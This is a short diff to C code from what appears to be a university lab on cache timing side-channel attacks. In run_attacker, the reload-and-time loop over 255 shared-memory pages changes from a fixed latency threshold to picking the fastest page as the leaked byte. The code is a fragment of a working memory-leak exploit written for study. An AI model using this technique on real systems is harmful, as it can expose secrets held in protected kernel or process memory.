@@ -10,8 +10,8 @@
 #include "lab2ipc.h"
 
 //Helper functions and misc variables
-uint64_t latency = 0;
-uint64_t threshold = 175;
+//uint64_t latency = 0;
+//uint64_t threshold = 175;
 
 char majority(char* array, size_t size) {
 	size_t max_count = 0;
@@ -93,16 +93,20 @@ int run_attacker(int kernel_fd, char *shared_memory) {
 	call_kernel_part2(kernel_fd, shared_memory, current_offset);
 
 	//Reload and check latency
-	size_t j;
-	for(j=0; j<255; j++) {
+	uint64_t latency = 0;	
+	uint64_t min_latency = 2000;
+	uint64_t min_latency_index = 0;
+
+	for(size_t j=0; j<255; j++) {
 		latency = time_access((char*)(shared_memory+j*4096));
 		//printf("Latency = %d\n", latency[i]);
-		if(latency < threshold) {
-			break;
+		if(latency < min_latency) {
+			min_latency = latency;
+			min_latency_index = j;
 		}	
 	}
 
-	leaked_byte_each_iter[k] = j;
+	leaked_byte_each_iter[k] = min_latency_index;
 	}
 
 	leaked_byte = majority(leaked_byte_each_iter, iter);	
